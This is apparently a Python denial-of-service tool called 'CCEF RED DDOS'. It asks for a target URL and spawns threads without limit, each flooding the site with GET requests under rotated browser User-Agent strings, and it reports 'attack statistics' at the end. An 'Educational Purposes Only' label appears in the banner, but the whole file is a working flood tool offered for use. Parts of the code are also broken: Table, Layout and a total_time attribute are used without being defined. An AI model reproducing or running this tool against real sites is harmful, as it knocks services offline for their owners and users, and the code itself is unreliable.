import requests
import threading
import time
import random
import sys
import os
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.align import Align
import signal

console = Console()

# Banner
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """[bold red]

▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒  [bright_yellow]╔══════════════════════════════╗[/]
▒▒█▒▒▒▄██████████▄▒▒▒▒  [bright_yellow]║[/]    [bold cyan]CCEF RED DDOS [/]     [bright_yellow]║[/]
▒█▐▒▒▒████████████▒▒▒▒  [bright_yellow]║[/]   [bold red]DEV BY MD SOFIKUL ISLAM[/]     [bright_yellow]║[/]
▒▌▐▒▒██▄▀██████▀▄██▒▒▒  [bright_yellow]╚══════════════════════════════╝[/]
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒  [bright_yellow][[/][bold red]WARNING[/][bright_yellow]][/] [bold white]Educational Purposes Only[/]
▐┼▐▒▒██████████████▒▒▒  [bright_yellow][[/][bold cyan]INFO[/][bright_yellow]][/] [bold white]Press Ctrl+C to Stop Attack[/]
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒  [bright_yellow][[/][bold green]TEAM[/][bright_yellow]][/] [bold white]CIVILIAN CYBER EXPERT FORCE[/]
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
⠀⠀⠀⠀⠀⠀[/]"""
    console.print(Align.center(banner))

# Stats class to track requests and responses
class Stats:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.timeouts = 0
        self.start_time = time.time()
        self.active = True

def format_number(num):
    return f"{num:,}"

# Send requests to the target
def send_request(url, thread_id, stats):
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36"
        ])
    }

    while stats.active:
        try:
            response = requests.get(url, headers=headers, timeout=3)
            stats.total_requests += 1

            if response.status_code == 200:
                stats.successful_requests += 1
                console.print(Panel(f"[green]Request Sent[/] ✅ [white]Thread #{thread_id} | Status: 200 OK[/]", border_style="green"))
            else:
                stats.failed_requests += 1
                console.print(Panel(f"[yellow]Request Failed[/] ⚠ [white]Thread #{thread_id} | Status: {response.status_code}[/]", border_style="yellow"))
        except requests.exceptions.RequestException as e:
            stats.failed_requests += 1
            console.print(Panel(f"[red]Connection Failed[/] ❌ [white]Thread #{thread_id} | Error: {str(e)}[/]", border_style="red"))

# Create results display
def create_results_display(stats):
    main_stats = Table.grid(padding=1)
    main_stats.add_column(style="bright_yellow", justify="right")
    main_stats.add_column(style="bold white")
    
    main_stats.add_row("Total Requests:", format_number(stats.total_requests))
    main_stats.add_row("Successful:", f"[bold green]{format_number(stats.successful_requests)}[/]")
    main_stats.add_row("Failed:", f"[bold red]{format_number(stats.failed_requests)}[/]")
    main_stats.add_row("Timeouts:", f"[bold yellow]{format_number(stats.timeouts)}[/]")

    elapsed = time.time() - stats.start_time
    rps = stats.total_requests / elapsed if elapsed > 0 else 0
    success_rate = (stats.successful_requests / stats.total_requests * 100) if stats.total_requests > 0 else 0
    avg_response = (stats.total_time / stats.total_requests) if stats.total_requests > 0 else 0

    perf_stats = Table.grid(padding=1)
    perf_stats.add_column(style="bright_yellow", justify="right")
    perf_stats.add_column(style="bold white")
    
    perf_stats.add_row("Requests/Second:", f"[bold cyan]{rps:.2f}[/]")
    perf_stats.add_row("Success Rate:", f"[bold green]{success_rate:.1f}%[/]")
    perf_stats.add_row("Avg Response:", f"[bold blue]{avg_response:.3f}s[/]")
    perf_stats.add_row("Total Time:", f"[bold magenta]{elapsed:.1f}s[/]")

    layout = Layout()
    layout.split_row(
        Panel(
            main_stats,
            title="[bold red]Attack Statistics[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        ),
        Panel(
            perf_stats,
            title="[bold red]Performance Metrics[/]",
            border_style="bright_yellow",
            padding=(1, 2)
        )
    )

    return layout

# Signal handler to stop the attack
def signal_handler(signum, frame):
    raise KeyboardInterrupt

# Main function
def main():
    clear_screen()
    print_banner()

    # Get URL and delay input from user
    url = console.input("\n[bright_yellow][[/][bold white]TARGET[/][bright_yellow]][/] [bold cyan]Enter URL:[/] ")
    delay = console.input("[bright_yellow][[/][bold white]SPEED[/][bright_yellow]][/] [bold cyan]Enter delay (0.1-1 sec, default: 0.1):[/] ")

    try:
        delay = float(delay)
        if not (0.1 <= delay <= 1):
            delay = 0.1
    except ValueError:
        delay = 0.1

    clear_screen()
    print_banner()

    attack_config = f"""[bold white]Target[/] : {url}
[bold white]Mode[/]   : Unlimited Threads
[bold white]Speed[/]  : {delay}s delay"""

    console.print(Panel(
        attack_config,
        title="[bold red]Attack Configuration[/]",
        border_style="bright_yellow",
        padding=(1, 2)
    ))

    stats = Stats()
    signal.signal(signal.SIGINT, signal_handler)

    # Progress bar setup
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]Running attack...[/]"),
        BarColumn(pulse_style="red"),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        try:
            thread_id = 1
            while stats.active:
                thread = threading.Thread(
                    target=send_request,
                    args=(url, thread_id, stats)
                )
                thread.daemon = True
                thread.start()
                thread_id += 1
                time.sleep(delay)

        except KeyboardInterrupt:
            stats.active = False
            console.print("\n[bold yellow]⚠ Attack stopped by user[/]")
        finally:
            time.sleep(1)
            console.print("\n")
            console.print(create_results_display(stats))

            if stats.total_requests > 0:
                vulnerability = "Target appears to be [bold green]vulnerable[/]!" if stats.successful_requests / stats.total_requests > 0.8 \
                    else "Target appears to be [bold yellow]resistant[/] to the attack."
                console.print(Panel(
                    vulnerability,
                    title="[bold red]Analysis Result[/]",
                    border_style="bright_yellow",
                    padding=(1, 2)
                ))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n[bold red]Fatal Error: {str(e)}[/]")
        sys.exit(1)